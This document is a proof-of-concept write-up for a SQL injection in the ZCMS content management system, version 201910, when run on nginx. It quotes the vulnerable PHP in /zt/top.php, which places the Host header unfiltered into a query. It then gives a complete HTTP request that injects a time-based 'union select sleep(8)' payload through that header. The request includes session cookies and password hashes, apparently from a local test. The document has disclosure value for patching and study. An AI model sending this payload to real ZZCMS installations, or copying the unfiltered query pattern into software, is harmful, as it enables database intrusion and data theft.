## ZZCMS sql injection in nginx server

## PoC by britzlieg

#### ZZCMS the 201910 version download page : 
http://www.zzcms.net/about/6.htm

#### zip installer:
http://www.zzcms.net/download/zzcms201910.zip

### vulnerability code:

In file `/zt/top.php`, line 5


```php
<?php
//echo $_SERVER['REQUEST_URI'];
$editor=isset($_REQUEST['editor'])?$_REQUEST['editor']:'';
$editor=substr($_SERVER['HTTP_HOST'],0,strpos($_SERVER['HTTP_HOST'],'.'));//从二级域名中获取用户名
$rs=query("select * from zzcms_userdomain where domain='".$_SERVER['HTTP_HOST']."' and passed=1 and del=0");//从顶级级域名中获取用户名
$row=num_rows($rs);
if (!$row){
	$row=fetch_array($rs);
	$editor=$row["username"];
}
$id=isset($_REQUEST['id'])?$_REQUEST['id']:0;
checkid($id,1);
...
```

in line 5,developer use `$_SERVER['HTTP_HOST']` in sql code without a filter, and this variable can be controled by attacker in nginx server. All page include `/zt/top.php` will be affected, here is an example named `/zt/news.php`.

```php
<?php
include("../inc/conn.php");
include("../inc/fy.php");
include("top.php");
include("bottom.php");
include("left.php");
...
```

#### POC:
```http
GET /zt/news.php?id=1&editor=cad HTTP/1.1
Host: 127.0.0.1:8211' union select sleep(8),1,2,3,4#-- '
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 186
Origin: http://127.0.0.1:8211
DNT: 1
Connection: close
Referer: http://127.0.0.1:8211/user/job.php?do=add
Cookie: bigclassid=0; province=%E5%8C%97%E4%BA%AC; city=%E5%B8%82%E8%BE%96%E5%8E%BF; __tins__713776=%7B%22sid%22%3A%201594217719660%2C%20%22vd%22%3A%205%2C%20%22expires%22%3A%201594220164112%7D; __51cke__=; __51laig__=14; bdshare_firstime=1594189355036; PHPSESSID=o78er4gbaan24nhv4a2oldnf18; UserName=test; PassWord=098f6bcd4621d373cade4e832627b4f6; admin=admin; pass=21232f297a57a5a743894a0e4a801fc3
Upgrade-Insecure-Requests: 1

jobname=1&sm=1&province=%E5%8C%97%E4%BA%AC&city=%E5%B8%82%E8%BE%96%E5%8C%BA&xiancheng=%E4%B8%9C%E5%9F%8E%E5%8C%BA&action=add&Submit=%E5%A1%AB%E5%A5%BD%E4%BA%86%EF%BC%8C%E5%8F%91%E5%B8%83

```


#### inject code
![](https://rawcdn.githack.com/britzlieg/POC/68c98bcf9159677c24aa102620416513868a27bf/res/zzcms201910/a.jpg)

#### sleep(8)
![](https://rawcdn.githack.com/britzlieg/POC/68c98bcf9159677c24aa102620416513868a27bf/res/zzcms201910/1.jpg)

#### sleep(1)
![](https://rawcdn.githack.com/britzlieg/POC/68c98bcf9159677c24aa102620416513868a27bf/res/zzcms201910/2.jpg)